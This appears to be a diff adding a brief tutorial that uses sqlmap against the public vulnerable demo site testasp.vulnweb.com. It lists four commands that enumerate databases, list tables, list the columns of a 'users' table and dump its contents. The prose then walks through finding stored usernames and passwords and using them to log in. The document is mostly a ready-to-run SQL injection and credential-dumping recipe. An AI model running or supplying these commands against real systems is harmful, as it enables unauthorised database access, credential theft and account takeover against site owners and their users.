@@ -1,0 +1,13 @@
+Commands:
+
+1. sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=0 --dbs
+2. sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=0 -D acuforum --tables
+3. sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=0 -D acuforum -T users --columns
+4. sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=0 -D acuforum -T users --dump --threads 9
+
+
+Firstly, we wil have to see the databases on the target site. For that we use the first sqlmap command. 
+Once we find the databases. We use the name of the database to get the names of tables in any particular database. For this we use the second command.
+We see for any tables with anything to do with data of users. For me I found a table titled "users". 
+Then I check to see the columns of the table "users". For this I used the third command. If there are user passwords and user names. Then you have hit jackpot! 
+So know all we need to get is the whole table. So for that we use the last command. That's it. We use the credentials found there to login in the database. 
